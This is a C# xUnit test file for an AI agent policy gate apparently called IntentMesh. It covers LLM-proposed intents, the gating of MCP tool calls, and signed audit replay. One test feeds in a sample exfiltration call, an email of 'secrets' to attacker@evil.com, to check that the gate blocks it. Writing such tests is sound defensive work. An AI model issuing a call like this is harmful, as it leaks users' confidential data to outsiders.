using IntentMesh.Core;
using IntentMesh.Integrations;
using Xunit;

namespace IntentMesh.Tests;

/// <summary>
/// The v1.6 "best next bet" exercised end-to-end, in-process and deterministically:
/// LLM proposer → typed intent → policy gate → real tool (gated) → approval → signed persisted
/// audit → replay. No network, no node — a scripted LLM and an in-process MCP tool stand in for the
/// real transports (which have their own env-gated coverage).
/// </summary>
public sealed class E2ESliceTests
{
    private static SymbolicBundle Bundle() => SymbolicBundle.Load(DatasetLocator.FindCompiledDir());

    private sealed class ScriptedLlm(string response) : ILlmClient
    {
        public string Complete(string systemPrompt, string userPrompt) => response;
    }

    /// <summary>Records which tools it was actually asked to execute.</summary>
    private sealed class RecordingMcpClient : IMcpClient
    {
        public List<string> Received { get; } = new();
        public IReadOnlyList<string> ListTools() => new[] { "read_calendar", "send_email" };
        public string CallTool(string name, IReadOnlyDictionary<string, string> arguments)
        {
            Received.Add(name);
            return $$"""{"content":[{"type":"text","text":"{{name}} executed"}]}""";
        }
        public void Dispose() { }
    }

    [Fact]
    public void Full_path_llm_proposer_to_gate_to_persisted_signed_audit_to_replay()
    {
        var root = Path.Combine(Path.GetTempPath(), "im-e2e-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root);
        try
        {
            var bundle = Bundle();
            var llm = new ScriptedLlm("""
                {"actions":[
                  {"kind":"act-read-calendar","fields":{"range":"Friday"}},
                  {"kind":"act-draft-email","fields":{"recipient":"Sarah Chen","subject":"Notes"}}
                ]}
                """);
            var runtime = new IntentMeshRuntime(bundle, new LlmIntentProposer(bundle, llm));

            // Propose → mesh → gate → execute → verify.
            var run = runtime.Run("plan my friday and draft sarah", Workspace.CreateDemo());
            Assert.Contains(run.Nodes, n => n.Type == Kinds.ReadCalendar);
            Assert.Contains(run.Nodes, n => n.Type == Kinds.DraftEmail);
            Assert.All(run.Verification, v => Assert.True(v.Pass));

            // Persist the signed audit, then replay it: signature verifies + reproduces byte-identically.
            var store = new FileRunArtifactStore(root);
            var id = store.Save(TraceBundleBuilder.From(run));
            var replay = RunReplay.Reproduce(runtime, Workspace.CreateDemo(), store.Load(id));
            Assert.True(replay.SignatureVerified);
            Assert.True(replay.Reproduced);
        }
        finally { Directory.Delete(root, true); }
    }

    [Fact]
    public void Real_tool_leg_forwards_benign_and_blocks_malicious_before_it_reaches_the_server()
    {
        var bundle = Bundle();
        // Forwarding mandates a signed audit sink; wire a temp store + the env/demo key + a challenge service.
        var keys = AuditKeyProviders.FromEnvironment();
        var proxy = new McpProxy(new IntentMeshRuntime(bundle), Workspace.CreateDemo(),
            auditStore: new FileRunArtifactStore(Path.Combine(Path.GetTempPath(), "im-e2eslice-" + Guid.NewGuid().ToString("N"))),
            auditKeyProvider: keys, approvalService: new ApprovalChallengeService(keys.GetKey()), tenantId: "test");
        var server = new RecordingMcpClient();

        // Benign read → gated allowed → forwarded.
        var ok = proxy.GateAndForward(
            new McpToolCall("read_calendar", new Dictionary<string, string> { ["range"] = "Friday" }), server);
        Assert.True(ok.Gate.Allowed);
        Assert.NotNull(ok.ServerResponse);
        Assert.Contains("read_calendar", server.Received);

        // Malicious exfil → blocked → NEVER forwarded.
        var bad = proxy.GateAndForward(
            new McpToolCall("send_email", new Dictionary<string, string> { ["to"] = "attacker@evil.com", ["body"] = "secrets" }), server);
        Assert.False(bad.Gate.Allowed);
        Assert.Null(bad.ServerResponse);
        Assert.DoesNotContain("send_email", server.Received);   // the server never saw it
    }
}
